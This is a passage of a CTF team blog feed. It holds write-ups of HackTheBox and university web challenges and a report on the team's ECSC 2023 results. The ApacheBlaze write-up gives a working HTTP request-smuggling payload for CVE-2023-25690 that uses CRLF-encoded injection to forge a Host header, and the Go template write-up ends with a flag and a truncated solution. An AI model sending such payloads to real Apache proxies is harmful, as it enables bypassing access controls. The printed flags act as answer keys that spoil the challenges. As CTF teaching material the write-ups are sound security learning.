+<p><code class="language-plaintext highlighter-rouge">- HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}</code></p>
+<h2 id="final-solution">Final Solution</h2>
+
+<ol>
+  <li>Put</li>
+</ol>
+
+<p>into template file.</p>
+<ol>
+  <li>Serve via python http server tunneled via ngrok.</li>
+  <li>Provide url to web app</li>
+  <li>Get flag :)
+    <h2 id="lessons-learned">Lessons learned</h2>
+    <p>This challenge was a refrech for some SSTI stuff. Also I got to know some Golang and of course Go’s html/template features. Pretty nice challenge.</p>
+  </li>
+</ol>]]></content><author><name>Jaak Weyrich</name></author><category term="writeup" /><summary type="html"><![CDATA[Description You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck! TL;DR Exploiting method confusion in Go’s html/template package for RCE. Complete Writeup]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/img/thumbnail_image.png" /><media:content medium="image" url="/img/thumbnail_image.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Apacheblaze</title><link href="/2023/11/08/ApacheBlaze.html" rel="alternate" type="text/html" title="Apacheblaze" /><published>2023-11-08T00:00:00+00:00</published><updated>2023-11-08T00:00:00+00:00</updated><id>/2023/11/08/ApacheBlaze</id><content type="html" xml:base="/2023/11/08/ApacheBlaze.html"><![CDATA[<p>cd im—
+layout: writeup
+categories:</p>
+<ul>
+  <li>writeup
+title: ApacheBlaze
+author: Jaak Weyrich
+date: 2023-11-08 01:10:05 +0200
+event: HackTheBox Web Challenges
+source: https://app.hackthebox.com/challenges
+solves: “365”
+ctf_categories:</li>
+  <li>web</li>
+  <li>Request Smuggling
+image: “img/thumbnail_image.png”
+—</li>
+</ul>
+
+<h2 id="description">Description</h2>
+<blockquote>
+  <p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p>
+  <h2 id="tldr">TL;DR</h2>
+  <p>Some <code class="language-plaintext highlighter-rouge">mod_proxy</code> configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack.</p>
+</blockquote>
+
+<p>This is exploited in a frontend reverse proxy server to forge a request to a backend server.</p>
+
+<h2 id="complete-writeup">Complete Writeup</h2>
+<p>We are greeted with the screen below. Looks like the application lets us chose between a couple of games:
+<img src="img/thumbnail_image.png" alt="" />
+Before we look at specific code, let’s get a feeling for what we’re deeling with. The provided files look as follows:
+<img src="img/treeCommand.png" alt="" />
+There seems to be not that much code. The backend just has the <code class="language-plaintext highlighter-rouge">app.py</code> and then there is some frontend stuff involved. Let’s take a look at the <code class="language-plaintext highlighter-rouge">app.py</code> first:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">GAMES</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">magic_click</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">click_mania</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">hyper_clicker</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">click_topia</span><span class="sh">'</span><span class="p">}</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">HTB{f4k3_fl4g_f0r_t3st1ng}</span><span class="sh">'</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">game</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">game</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Empty game name is not supported!.</span><span class="sh">'</span>
+        <span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="k">elif</span> <span class="n">game</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">GAMES</span><span class="sh">'</span><span class="p">]:</span>
+        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Invalid game name!</span><span class="sh">'</span>
+        <span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="k">elif</span> <span class="n">game</span> <span class="o">==</span> <span class="sh">'</span><span class="s">click_topia</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">X-Forwarded-Host</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="sh">'</span><span class="s">dev.apacheblaze.local</span><span class="sh">'</span><span class="p">:</span>
+        <span class="c1">#if 'dev.apacheblaze.local' in request.headers.get('X-Forwarded-Host'):
+</span>            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+                <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">FLAG</span><span class="sh">"</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span>
+            <span class="p">}),</span> <span class="mi">200</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+                <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">This game is currently available only from dev.apacheblaze.local.</span><span class="sh">'</span>
+            <span class="p">}),</span> <span class="mi">200</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">This game is currently unavailable due to internal maintenance.</span><span class="sh">'</span>
+        <span class="p">}),</span> <span class="mi">200</span>
+</code></pre></div></div>
+<p>From this backend code, the flag seems to be simply accessible by selecting the <code class="language-plaintext highlighter-rouge">click_topia</code> game while providing a specific <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> header.
+Trying this doesn’t work unfortunately. Debugging shows that the X-Forwarded-Host header arriving at the backend looks as follows <code class="language-plaintext highlighter-rouge">dev.apacheblaze.local, localhost:1337, 127.0.0.1:8080</code>, indicating that my entry does reach it, but other entries are appended as well, causing the check to fail. Let’s remember this fact for later.
+Looking at the frontend code doesnt help much either, it is simply some index.html along with a pretty simple script in fetchAPI.js:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.game a</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">event</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+      <span class="kd">var</span> <span class="nx">gameName</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
+
+      <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+          <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/api/games/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">gameName</span><span class="p">,</span>
+          <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+              <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+              <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#gameplayresults</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+          <span class="p">},</span>
+          <span class="na">error</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+              <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#gameplayresults</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error fetching API data.</span><span class="dl">"</span><span class="p">);</span>
+          <span class="p">}</span>
+      <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>Let’s take a look at what else there is to this web application and how it is configured.
+The <code class="language-plaintext highlighter-rouge">Dockerfile</code> reveals some pretty interesting stuff:</p>
+<div class="language-Dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> alpine:3</span>
+
+<span class="c"># Install system packages</span>
+<span class="k">RUN </span>apk add <span class="nt">--no-cache</span> <span class="nt">--update</span> wget apr-dev apr-util-dev gcc libc-dev <span class="se">\
+</span>    pcre-dev make musl-dev
+
+<span class="c"># Download and extract httpd</span>
+<span class="k">RUN </span>wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-xvf</span> httpd-2.4.55.tar.gz
+
+<span class="k">WORKDIR</span><span class="s"> httpd-2.4.55</span>
+
+<span class="c"># Compile httpd with desired modules</span>
+<span class="k">RUN </span>./configure <span class="se">\
+</span>    <span class="nt">--prefix</span><span class="o">=</span>/usr/local/apache2 <span class="se">\
+</span>    <span class="nt">--enable-mods-shared</span><span class="o">=</span>all <span class="se">\
+</span>    <span class="nt">--enable-deflate</span> <span class="se">\
+</span>    <span class="nt">--enable-proxy</span> <span class="se">\
+</span>    <span class="nt">--enable-proxy-balancer</span> <span class="se">\
+</span>    <span class="nt">--enable-proxy-http</span> <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> make <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> make <span class="nb">install</span>
+
+<span class="c"># Move compiled httpd binary</span>
+<span class="k">RUN </span><span class="nb">mv </span>httpd /usr/local/bin
+
+<span class="k">WORKDIR</span><span class="s"> /</span>
+
+<span class="c"># Copy Apache config files</span>
+<span class="k">COPY</span><span class="s"> conf/httpd.conf /tmp/httpd.conf</span>
+<span class="k">RUN </span><span class="nb">cat</span> /tmp/httpd.conf <span class="o">&gt;&gt;</span> /usr/local/apache2/conf/httpd.conf
+
+<span class="c"># Can't bind to port 80</span>
+<span class="k">RUN </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'/^Listen 80$/s/^/#/'</span> /usr/local/apache2/conf/httpd.conf
+
+<span class="c"># Copy challenge files</span>
+<span class="k">COPY</span><span class="s"> challenge/frontend/src/. /usr/local/apache2/htdocs/</span>
+<span class="k">RUN </span><span class="nb">mkdir</span> /app
+
+<span class="c"># Copy application and configuration files</span>
+<span class="k">COPY</span><span class="s"> conf/. /app</span>
+<span class="k">COPY</span><span class="s"> challenge/backend/src/. /app</span>
+
+<span class="c"># Install Python dependencies</span>
+<span class="k">RUN </span>apk add <span class="nt">--update</span> <span class="nt">--no-cache</span> <span class="se">\
+</span>    g++ <span class="se">\
+</span>    python3 <span class="se">\
+</span>    python3-dev <span class="se">\
+</span>    build-base <span class="se">\
+</span>    linux-headers <span class="se">\
+</span>    py3-pip <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> pip <span class="nb">install</span> <span class="nt">-I</span> <span class="nt">--no-cache-dir</span> <span class="nt">-r</span> /app/requirements.txt
+
+<span class="c"># Add a system user and group</span>
+<span class="k">RUN </span>addgroup <span class="nt">-S</span> uwsgi-group <span class="o">&amp;&amp;</span> adduser <span class="nt">-S</span> <span class="nt">-G</span> uwsgi-group uwsgi-user
+
+<span class="c"># Fix permissions</span>
+<span class="k">RUN </span><span class="nb">chown</span> <span class="nt">-R</span> uwsgi-user:uwsgi-group /usr/local/apache2/logs <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>755 /usr/local/apache2/logs <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">touch</span> /usr/local/apache2/logs/error.log <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">chown </span>uwsgi-user:uwsgi-group /usr/local/apache2/logs/error.log <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>644 /usr/local/apache2/logs/error.log
+
+<span class="c"># Switch user to uwsgi-user</span>
+<span class="k">USER</span><span class="s"> uwsgi-user</span>
+
+<span class="c"># Expose Apache's port</span>
+<span class="k">EXPOSE</span><span class="s"> 1337</span>
+
+<span class="c"># Run httpd and uwsgi</span>
+<span class="k">CMD</span><span class="s"> ["sh", "/app/uwsgi/start_uwsgi.sh"]</span>
+</code></pre></div></div>
+
+<p>It downloads httpd (Apache HTTP Server) version 2.4.55 and compiles it with a list of modules. We got a version number, let’s google for vulnerabilities. This reveals the following URL, with an HTTP Request Splitting/Smuggling vulnerability right at the top, relevant to the version the server is running on.
+https://httpd.apache.org/security/vulnerabilities_24.html
+The description of the vulnerability (CVE-2023-25690) states that certain modules have to be used and have to be configured in a certain way for the vulnerability to be present.
+<img src="img/ApacheHTTPServerVulnerabilities.png" alt="" />
+Checking the <code class="language-plaintext highlighter-rouge">httpd.conf</code> file, we can see that the server is actually set up with some sort of multi-layer architecture, using one reverse proxy, one load balancing proxy and 2 backends; this proxy/backend architecture points to the request smuggling vulnerability mentioned above. Taking a closer look, one can even identify the specified module (<code class="language-plaintext highlighter-rouge">mod_proxy</code>) and recognize the pattern (marked in the above screenshot) along with the necessary RewriteRule for the vulnerability to apply:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ServerName _
+ServerTokens Prod
+ServerSignature Off
+
+Listen 8080
+Listen 1337
+
+ErrorLog "/usr/local/apache2/logs/error.log"
+CustomLog "/usr/local/apache2/logs/access.log" common
+
+LoadModule rewrite_module modules/mod_rewrite.so
+LoadModule proxy_module modules/mod_proxy.so
+LoadModule proxy_http_module modules/mod_proxy_http.so
+LoadModule proxy_balancer_module modules/mod_proxy_balancer.so
+LoadModule slotmem_shm_module modules/mod_slotmem_shm.so
+LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so
+
+&lt;VirtualHost *:1337&gt;
+
+    ServerName _
+
+    DocumentRoot /usr/local/apache2/htdocs
+
+    RewriteEngine on
+
+    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
+    ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"
+
+&lt;/VirtualHost&gt;
+
+&lt;VirtualHost *:8080&gt;
+
+    ServerName _
+
+    ProxyPass / balancer://mycluster/
+    ProxyPassReverse / balancer://mycluster/
+
+    &lt;Proxy balancer://mycluster&gt;
+        BalancerMember http://127.0.0.1:8081 route=127.0.0.1
+        BalancerMember http://127.0.0.1:8082 route=127.0.0.1
+        ProxySet stickysession=ROUTEID
+        ProxySet lbmethod=byrequests
+    &lt;/Proxy&gt;
+
+&lt;/VirtualHost&gt;
+
+</code></pre></div></div>
+<p>Okay, looks like we have found ourselves a vulnerability, now onto exploiting it. Unfortunately, apache.org (nor any resource it points to) does not describe how to exploit the vulnerability exactly.
+A quick google search for a proof of concept for the vulnerability CVE-2023-25690 reveals a github repository that has everything we need:
+https://github.com/dhmosfunk/CVE-2023-25690-POC
+Injecting <code class="language-plaintext highlighter-rouge">\r\n\r\n</code> enables splitting the HTTP request and now lets us send new ones from the reverse proxy server. Before we get into the details of the payload, let’s understand what the flow of HTTP requests is exactly:</p>
+<ul>
+  <li>Our initial request to <code class="language-plaintext highlighter-rouge">GET /api/games/click_topia</code> is being processed by the reverse proxy running on port 1337. Here, the <code class="language-plaintext highlighter-rouge">mod_proxy</code> module is enabled and used for handling the request (indicated by the <code class="language-plaintext highlighter-rouge">[P]</code> in the line of the rewrite rule) and the rewrite rule rewrites <code class="language-plaintext highlighter-rouge">"^/api/games/(.*)"</code> to <code class="language-plaintext highlighter-rouge">"http://127.0.0.1:8080/?game=$1"</code>, meaning a request to <code class="language-plaintext highlighter-rouge">/api/games/anything</code> becomes <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080/?game=anything</code>. The latter pattern also matches the endpoint in the backend much better. This request is now forwarded to the load balancing proxy running on port 8080.</li>
+  <li>The load balancing proxy receives the request and will forward it to either backend (either on port 8081 or 8082), depending on the current load and the <code class="language-plaintext highlighter-rouge">lbmethod</code> directive, but this detail does not matter that much in this case.</li>
+  <li>The backend receives the request and in case the request is made to <code class="language-plaintext highlighter-rouge">/?game=click_topia</code>, it will check for <code class="language-plaintext highlighter-rouge">dev.apacheblaze.local</code> being present in which case the flag will be returned.</li>
+</ul>
+
+<p>Now, it turns out that:</p>
+<blockquote>
+  <p>When acting in a reverse-proxy mode (using the <code class="language-plaintext highlighter-rouge">ProxyPass</code> directive, for example), <code class="language-plaintext highlighter-rouge">mod_proxy_http</code> adds several request headers in order to pass information to the origin server. These headers are: […] X-Forwarded-Host: The original host requested by the client in the <code class="language-plaintext highlighter-rouge">Host</code> HTTP request header.</p>
+</blockquote>
+
+<p>This explains why there were other entries in the X-Forwarded-Host header, appended to the one I gave in my first attempt. Both the reverse proxy (port 1337) and the load balancing proxy (port 8080) were acting in a reverse-proxy mode using the ProxyPass directive, making them append the <code class="language-plaintext highlighter-rouge">Host</code>header in the request the got to the request they forwarded. I.e. I appended <code class="language-plaintext highlighter-rouge">dev.apacheblaze.local</code> as X-Forwarded-For, requesting the reverse proxy with Host <code class="language-plaintext highlighter-rouge">localhost:1337</code>, which was appended by the reverse proxy to the request sent to the load balancing proxy with Host <code class="language-plaintext highlighter-rouge">127.0.0.1:8080</code>, in turn appended by the load balancing proxy in his request to the backend. Now the X-Forwarded-Host header has 3 entries…</p>
+
+<p>Knowing this, I can craft a payload. The first line of a normal http request to the click_topia /game endpoint would look like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+
+
+</code></pre></div></div>
+<p>Mine now looks like this (note the url encoded <code class="language-plaintext highlighter-rouge">\r\n</code> as <code class="language-plaintext highlighter-rouge">%0d%0a</code>):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/abc HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+
+
+</code></pre></div></div>
+<p>The reverse proxy server receiving my initial request, using the rewrite rule, splits this up into two separate http requests:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia HTTP/1.1
+Host: dev.apacheblaze.local
+
+
+GET /abc HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+</code></pre></div></div>
+<p>These requests are now forwarded to the load balancing proxy (I will receive the response for the first request), the load balancing proxy appends the <code class="language-plaintext highlighter-rouge">Host</code> header (<code class="language-plaintext highlighter-rouge">dev.apacheblaze.local</code>) of the request as <code class="language-plaintext highlighter-rouge">X-Forwarded_Host</code> header, this is sent to the backend and the check is passed.
+<img src="img/burpPayloadFlagScreenshot.png" alt="" />
+<code class="language-plaintext highlighter-rouge">HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</code></p>
+<h2 id="final-solution">Final Solution</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/abc HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+
+
+</code></pre></div></div>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+<p>I learned quite something about apache httpd and its different configurations regarding proxies. The challenge also was a refresher for some request smuggling concepts.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[cd im— layout: writeup categories: writeup title: ApacheBlaze author: Jaak Weyrich date: 2023-11-08 01:10:05 +0200 event: HackTheBox Web Challenges source: https://app.hackthebox.com/challenges solves: “365” ctf_categories: web Request Smuggling image: “img/thumbnail_image.png” —]]></summary></entry><entry><title type="html">ECSC 2023 Post Mortem</title><link href="/news/2023/11/02/ecsc-2023-finals.html" rel="alternate" type="text/html" title="ECSC 2023 Post Mortem" /><published>2023-11-02T15:10:05+00:00</published><updated>2023-11-02T15:10:05+00:00</updated><id>/news/2023/11/02/ecsc-2023-finals</id><content type="html" xml:base="/news/2023/11/02/ecsc-2023-finals.html"><![CDATA[<h1 id="letzpwn-goes-ecsc-2023">LetzPwn goes ECSC 2023</h1>
+
+<h3 id="intro">Intro</h3>
+<p>Same as last year, and hopefully many years to come, Team Luxembourg competed again against the best young talents from all around Europe in the European Cybersecurity Challenge 2023, organized every year by ENISA. This year, the competition was organized by Norway. It took place in the small city of Hamar from 23rd to 27th October.</p>
+
+<p>Considering the fact that the LetzPwn CTF Team emerged from Luxembourg’s first participation in the ECSC back in 2019, LetzPwn provides most of the talents representing Luxembourg. In Hamar, the contestants faced many different challenges in separate styles of competition.</p>
+
+<p><img src="img/ECSC23_teamphoto.jpg" alt="" /></p>
+
+<h3 id="the-location">The Location</h3>
+<p>The competition took place in Hamar, a small city north of Oslo and right next to Norway’s largest lake “Mjøsa”. Specifically, the Luxembourgish talents competed against the other teams in the “Vikingskipet”, a huge speed skating hall built for the 1994 winter Olympics.</p>
+
+<p><img src="img/ECSC23_Hamar_Vikingskipet.jpeg" alt="" /></p>
+
+<h3 id="the-competition">The competition</h3>
+
+<p>The actual competition took place over 3 days. Day 1 was 6.5 hours of Jeopardy-style CTF, Day 2 was 10 hours of Attack-Defense and Day 3 was again 6.5 hours of Jeopardy. All in all, there were 34 countries represented, out of which 28 were EU-member countries while the others were guest countries.</p>
+
+<p><img src="img/ECSC23_competition.jpeg" alt="" /></p>
+
+<p>Team Luxembourg started out strong on all 3 days, beating high-caliber teams during the first couple of hours, sometimes placing in the range of 10th-15th place. Towards the end, Team LU usually dropped a little towards ~22nd-3rd out of 34 countries (https://ecsc.no/teams). In the below snapshot, you can see Luxembourg sitting right in Austria’s neck, with Team USA behind them:</p>
+
+<p><img src="img/ECSC23_luxBetterThanUS.png" alt="" /></p>
+
+<h3 id="final-scores">Final Scores</h3>
+
+<p>Unfortunately, the organizors (and hence also the participants) faced some technical difficulties during the event, particularly during the Attack-Defense part. Due to this, the competition (unofficially) ended a little earlier than expected on the second day.</p>
+
+<p>Nevertheless, the event was fun and engaging, gave many opportunities for connecting with like-minded people from other countries and for Team Luxembourg it was definitely a success!</p>
+
+<p>On the final scoreboard, Team Luxembourg takes the 20th place out of the 28 EU-member countries, which is a significant improvement from the 23rd place which we took last year. Also, considering Luxembourg is the 3rd smallest participating country (behind Liechtenstein and Iceland), we’re proud of our achievement and we’ll definitely be back next year for more!</p>
+
+<p><img src="img/ECSC23_finalScoreboard.png" alt="" /></p>
+
+<p>Last but not least, we want to express our gratitute to Cybersecurity Luxembourg and their sponsors for making this event possible!</p>
+
+<p><img src="img/ECSC23_CSWLGala.png" alt="" /></p>
+
+<p>(Some pictures taken from https://emilnyeng.pixieset.com/ecsc2023-hamar/)</p>]]></content><author><name>Jaak W.</name></author><category term="news" /><category term="ECSC" /><category term="Post Mortem" /><summary type="html"><![CDATA[LetzPwn goes ECSC 2023]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/img/ECSC23_teamphoto.jpg" /><media:content medium="image" url="/img/ECSC23_teamphoto.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Uni Webchallenge Part 1</title><link href="/writeup/2023/01/14/UniWebPart1.html" rel="alternate" type="text/html" title="Uni Webchallenge Part 1" /><published>2023-01-14T23:10:05+00:00</published><updated>2023-01-14T23:10:05+00:00</updated><id>/writeup/2023/01/14/UniWebPart1</id><content type="html" xml:base="/writeup/2023/01/14/UniWebPart1.html"><![CDATA[<h2 id="description">Description</h2>
+<blockquote>
+  <p>The source code and the public key of a web application are provided. The flag format is FLG1{xxx}.</p>
+</blockquote>
+
+<h2 id="tldr">TL;DR</h2>
+<p>Authentication bypass using vulnerable JWT through accepted untrusted user input in JWT header algorithm.</p>
+
+<h2 id="complete-writeup">Complete Writeup</h2>
+
+<p>We get a zip file containing the public key as well as the source code of the web application. Let’s look at what the folder looks like:</p>
+
+<p><img src="img/uniweb1_tree.png" alt="" /></p>
+
+<p>For this challenge (part 1 of the web challenge), mainly the <code class="language-plaintext highlighter-rouge">/src/index.js</code> will be important.</p>
+
+<p>Let’s first investigate the webapp manually to get a feeling of what we’re working with, then look at the code. When connecting to the web app, we see a pretty empty page just asking for a username to log in:</p>
+
+<p><img src="img/uniweb2_loginform.png" alt="" /></p>
+
+<p>Burpsuite reveals an interesting <code class="language-plaintext highlighter-rouge">/get_token</code> endpoint.</p>
+
+<p><img src="img/uniweb3_getToken.png" alt="" /></p>
+
+<p><img src="img/uniweb4_getTokenB64.png" alt="" /></p>
+
+<p>Looks like base64, decoded becomes:</p>
+
+<p><img src="img/uniweb5_tokenDecoded.png" alt="" /></p>
+
+<p>So, looks like a JWT with a header including the algorithm, the body including a field <code class="language-plaintext highlighter-rouge">login_permissions</code> set to <code class="language-plaintext highlighter-rouge">false</code> and a signature at the end. When trying to log in, this JWT is sent in an <code class="language-plaintext highlighter-rouge">Authorization</code> header in the request and Login fails.</p>
+
+<p><img src="img/uniweb6_unauthorized.png" alt="" /></p>
+
+<p>Ok, so now let#s have a look at the code to understand what’s happening underneath. This is <code class="language-plaintext highlighter-rouge">index.js</code>:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-session</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">mustacheExpress</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mustache-express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">redis</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">redis</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">engine</span><span class="p">(</span><span class="dl">'</span><span class="s1">mustache</span><span class="dl">'</span><span class="p">,</span> <span class="nf">mustacheExpress</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/views/partials</span><span class="dl">'</span><span class="p">));</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mustache</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">__dirname</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/views</span><span class="dl">'</span><span class="p">);</span>
+
